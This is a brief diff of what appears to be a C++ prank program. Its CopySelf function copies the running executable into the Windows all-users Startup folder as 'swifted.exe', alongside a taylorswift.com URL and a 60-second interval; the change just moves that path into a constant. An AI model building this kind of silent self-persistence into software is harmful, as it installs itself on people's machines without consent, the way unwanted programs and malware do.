@@ -7,6 +7,7 @@
 
 constexpr auto INTERVAL_MS = 60000;
 constexpr auto URL = L"http://www.taylorswift.com";
+constexpr auto STARTUP_PATH = L"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\swifted.exe";
 constexpr auto MAX_CHAR_LENGTH = 4096;
 
 // Convert a char[] to LPCWSTR
@@ -25,7 +26,7 @@ void CopySelf() {
 
 	GetModuleFileNameA(NULL, filename, MAX_PATH);
 
-	CopyFile(ToLPCWSTR(filename), L"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\swifted.exe", 0);
+	CopyFile(ToLPCWSTR(filename), STARTUP_PATH, 0);
 }
 
 int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
